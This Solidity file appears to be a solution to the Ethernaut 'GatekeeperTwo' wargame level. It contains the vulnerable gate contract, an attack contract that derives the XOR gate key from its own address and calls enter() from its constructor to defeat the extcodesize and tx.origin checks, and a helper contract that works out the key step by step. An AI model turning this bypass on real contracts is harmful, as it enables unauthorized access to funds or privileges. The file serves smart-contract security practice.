// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0, "Gate 2");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max,
            "Gate 3"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

interface GateI {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateIIHaker {
    GateI public gate;
    uint64 public keyPart;
    bytes8 public gateKey;
    
    constructor(address _gateI) {
        gate = GateI(_gateI);
        keyPart = (uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gateKey = (~bytes8(uint64((keyPart))));
        gate.enter(gateKey);
    }
}

contract Haker {
    uint64 public keyPart;
    uint public gateKey;
    bytes8 public trueGateKey;

    function hack() public returns (uint64) {
        keyPart = (uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        return (keyPart);
    }

    function k() public returns (uint) {
        gateKey = uint64(bytes8(~bytes8(uint64((keyPart)))));
        require(keyPart ^ uint64(gateKey) == type(uint64).max, "E");
        return gateKey;
    }

    function bit() public returns (bytes8) {
        trueGateKey = bytes8(uint64(gateKey));
        return (trueGateKey);
    }

    function computeKey() public returns (uint64) {
        hack();
        k();
        bit();
        return ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    }
}
